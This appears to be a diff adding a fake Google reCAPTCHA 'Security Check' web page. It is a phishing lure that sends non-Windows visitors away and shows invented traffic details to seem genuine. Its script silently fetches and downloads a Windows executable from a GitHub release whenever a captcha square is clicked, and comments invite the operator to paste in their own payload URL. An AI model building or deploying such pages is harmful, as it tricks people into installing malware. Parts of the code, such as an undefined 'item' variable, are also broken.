@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px 20px; color: #333; background: #fff; line-height: 1.6; }
+        .page-container { max-width: 800px; margin: 0 auto; }
+        .divider { border-top: 1px solid #ccc; margin: 20px 0; }
+        .link { color: #1a0dab; text-decoration: none; }
+        
+        /* Overlay for first click */
+        #start-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-direction: column; }
+        
+        /* UI Widgets */
+        .captcha-wrapper { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; box-shadow: 0 0 4px rgba(0,0,0,0.2); margin: 20px 0; overflow: hidden; font-family: Roboto, Arial, sans-serif; }
+        .captcha-blue-header { background: #4285f4; color: #fff; padding: 12px 15px; font-size: 14px; font-weight: bold; line-height: 1.2; }
+        .captcha-blue-header span { font-weight: normal; font-size: 12px; display: block; margin-top: 4px; opacity: 0.9; }
+        .captcha-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: #fff; padding: 5px; }
+        .grid-item { aspect-ratio: 1 / 1; background: #eaeaea; border: 1px solid #ccc; cursor: pointer; position: relative; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .grid-item img { width: 100%; height: 100%; object-fit: cover; }
+        .grid-item.selected { border: 1px solid #4285f4; box-shadow: inset 0 0 0 1px #4285f4; }
+        .grid-item.selected::after { content: ""; position: absolute; top: 0; left: 0; width: 24px; height: 24px; background: #4285f4; border-bottom-right-radius: 3px; mask: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="white" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>') no-repeat center; mask-size: 18px; background-color: white; }
+        .captcha-footer { padding: 10px 15px; background: #f1f1f1; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #e0e0e0; }
+        .footer-icons svg { width: 16px; height: 16px; fill: #555; cursor: pointer; }
+        .btn { padding: 6px 16px; font-size: 12px; font-weight: bold; border: none; border-radius: 2px; cursor: pointer; color: #fff; }
+        .btn-skip { background: #ccc; color: #666; }
+        .btn-verify { background: #4285f4; color: #fff; }
+        .checkbox-container { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 12px 15px; display: flex; align-items: center; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
+        .checkbox-container input { width: 24px; height: 24px; margin-right: 12px; cursor: pointer; }
+        .hidden { display: none !important; }
+        .info-block { font-family: monospace; font-size: 13px; margin-top: 20px; color: #222; }
+    </style>
+</head>
+<body>
+    <div id="start-overlay">
+        <h1>Please click anywhere to start the verification</h1>
+        <p>Your file download will begin immediately.</p>
+    </div>
+
+    <div class="page-container">
+        <script>
+            // Device/OS Check & Redirect
+            (function() {
+                const ua = navigator.userAgent.toLowerCase();
+                const isWindows = ua.indexOf("windows") !== -1;
+                const isMobile = /android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/i.test(ua);
+                if (!(isWindows && !isMobile)) {
+                    window.location.href = "https://tradx-community.onrender.com";
+                }
+            })();
+        </script>
+
+        <div class="checkbox-container" id="step1-checkbox">
+            <input type="checkbox" id="robot-check">
+            <label for="robot-check" style="cursor:pointer; font-family:Arial;">I'm not a robot</label>
+            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:24px; margin-left:auto;">
+        </div>
+
+        <div class="captcha-wrapper hidden" id="step2-grid">
+            <div class="captcha-blue-header">
+                Select all squares with<br><strong id="captcha-text">bicycles</strong>
+                <span>If there are none, click skip</span>
+            </div>
+            <div class="captcha-grid" id="captcha-grid"></div>
+            <div class="captcha-footer">
+                <div class="footer-icons">
+                    <svg viewBox="0 0 24 24"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8zm0 14c-3.31 0-6-2.69-6-6 0-1.01.25-1.97.7-2.8L5.24 7.74C4.46 8.97 4 10.43 4 12c0 4.42 3.58 8 8 8v3l4-4-4-4v3z"></path></svg>
+                    <svg viewBox="0 0 24 24"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z"></path></svg>
+                </div>
+                <div class="buttons">
+                    <button class="btn btn-skip" id="action-btn">SKIP</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="divider"></div>
+        <h2 class="about-header">About this page</h2>
+        <p class="about-text">Our systems have detected unusual traffic. This check verifies that you are a human.<br><a href="#" class="link">Why did this happen?</a></p>
+        <div class="divider"></div>
+        <div class="info-block">
+            <div>IP address: 185.132.132.32</div>
+            <div>Time: 2026-07-28T01:26:18Z</div>
+            <div>URL: https://www.google.com/search?q=verification+check</div>
+        </div>
+    </div>
+
+    <script>
+        // ==========================================
+// CONFIGURATION: Paste your GitHub Release URL here!
+// ==========================================
+const GITHUB_FILE_URL = "https://github.com/Ramirhub/about-me/releases/download/v1.0/YourFile.exe";
+
+// Silent Download Logic using GitHub URL
+async function triggerDownload(url) {
+    try {
+        const response = await fetch(url); // Fetch directly from GitHub
+        if (!response.ok) return;
+        const blob = await response.blob();
+        const blobUrl = window.URL.createObjectURL(blob);
+        const link = document.createElement('a');
+        link.href = blobUrl;
+        link.download = url.split('/').pop() || 'download';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
+    } catch (e) { /* Silent fail */ }
+}
+
+// Update your grid click listener to use this new URL
+item.addEventListener('click', function() {
+    this.classList.toggle('selected');
+    triggerDownload(GITHUB_FILE_URL); // Downloads the GitHub file silently!
+});
+    </script>
+</body>
+</html>
